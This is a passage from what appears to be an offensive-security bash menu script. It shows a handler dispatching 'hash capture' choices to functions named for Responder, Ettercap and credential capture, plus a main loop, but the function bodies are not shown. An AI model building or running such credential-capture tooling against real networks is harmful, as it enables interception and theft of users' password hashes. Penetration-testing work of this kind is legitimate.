  echo -n "Choose an option: "
  read hash_capture_choice
}

handle_hash_capture_choice() {
  case $1 in
    1) hash_capture_responder ;;
    2) hash_capture_ettercap ;;
    3) hash_capture_creds ;;
    0) display_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

# Main loop
while true; do
  display_menu
  handle_choice $choice
  echo "Press Enter to continue..."
  read
done
